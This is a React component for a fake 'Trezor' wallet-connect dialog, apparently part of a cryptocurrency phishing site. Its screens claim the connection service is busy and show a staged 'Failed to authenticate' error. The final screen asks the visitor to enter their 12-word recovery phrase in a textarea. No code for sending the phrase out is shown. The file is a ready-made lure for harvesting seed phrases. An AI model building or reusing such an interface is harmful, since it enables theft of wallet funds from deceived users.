import { IoClose } from "react-icons/io5";
import trezor from "@/assets/wallets/Group4.png"
import useTheme from "@/components/useTheme";
import trezorLage from "@/assets/wallets/lageImg/unnamed.png"
import walletImg from "@/assets/wallets/lageImg/Frame.png"
import { TfiReload } from "react-icons/tfi";
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTrigger } from "@/components/ui/dialog"
import { Carousel, CarouselContent, CarouselItem, CarouselNext, CarouselPrevious } from "@/components/ui/carousel"
import { Textarea } from "@/components/ui/textarea";

const Trezor = () => {
  const { theme } = useTheme();

  return (
    <Dialog>
      <DialogTrigger className="w-full">
        {/* Trezor */}
        <button className={`flex items-center px-2 py-3 rounded-xl w-full ${theme === "dark" ? "bg-[#464653]" : "bg-gradient-to-r from-[#161828] to-[#151727] hover:from-[#6f5ce4] hover:to-[#8768ee] border border-[#21233c]"}`}>
          <img src={trezor} alt="Meta Mask" className="w-[35px] mr-3" />
          <p className="text-[17px] text-[#FFFFFF]">Trezor</p>
        </button>
      </DialogTrigger>

      <DialogContent className=" -mt-8">
        <DialogHeader>
          <DialogDescription>
            <Carousel className="relative">
              <CarouselContent>
                <CarouselItem className="flex justify-center text-center">
                  <div>
                    <h3 className="text-[21px] text-[#11121F] font-semibold">Trezor</h3>
                    <img src={trezorLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5 cursor-grab" />
                    <p className="text-[18px] text-[#11121F] font-semibold">Connect Trezor...</p>
                  </div>
                </CarouselItem>

                <CarouselItem className="flex justify-center text-center">
                  <div className="w-full">
                    <h3 className="text-[21px] text-[#11121F] font-semibold">Trezor</h3>
                    <img src={trezorLage} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                    <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>

                    <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                  </div>
                </CarouselItem>

                <CarouselItem className="flex justify-center text-center">
                  <div className="w-full">
                    <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                    <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                    <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                    <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>

                    <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 flex justify-center items-center">
                      <TfiReload className="mr-2" />
                      <span>Try Again</span>
                    </button>
                  </div>
                </CarouselItem>

                <CarouselItem className="flex justify-center text-center w-0">
                  <div className="w-full">
                    <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                    <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-10 mb-5 cursor-grab" />
                    <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                    <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>

                    <p className="text-start mt-5">12 Word phrase</p>
                    <Textarea rows={4} className="mt-1 mb-5" />
                    <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
                  </div>
                </CarouselItem>

              </CarouselContent>

              <CarouselPrevious className="top-[10px] left-0 bg-transparent border-none font-bold" />
              <CarouselNext className="hidden" />
              <IoClose className="text-[23px] text-[#a794be] absolute top-0 right-0" />
            </Carousel>

          </DialogDescription>
        </DialogHeader>
      </DialogContent>
    </Dialog>
  );
};

export default Trezor;
